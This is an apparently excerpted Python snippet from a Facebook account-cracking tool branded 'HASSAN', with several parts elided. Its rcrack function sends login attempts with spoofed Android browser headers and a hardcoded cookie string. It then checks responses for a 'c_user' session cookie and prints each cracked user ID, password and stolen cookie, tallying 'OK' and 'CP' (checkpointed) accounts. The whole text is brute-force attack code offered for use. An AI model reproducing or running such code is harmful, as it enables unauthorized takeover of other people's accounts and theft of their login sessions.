...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=P3DdZCisHIczlEgaZ9qp2Nxj; sb=P3DdZK20aTJ6PXB-JfB1E2Ru; locale=en_GB; vpd=v1%3B646x360x2; wl_cbv=v2%3Bclient_version%3A2307%3Btimestamp%3A1692290462; dpr=2.1988937854766846; wd=360x646; fr=0nRCyALmvl22ux1ue.AWWb-dvCL95nOmcEfr88zrnSJ84.Bk3XA_.xn.AAA.0.0.Bk33T6.AWVB6dtBo5A',
    'dpr': '2',
    'save-data': 'on',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('    \33[1;30m(HASSAN-OK 💚)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('   \033[1;32m(HASSAN-CP 🥺)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[HASSAN] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
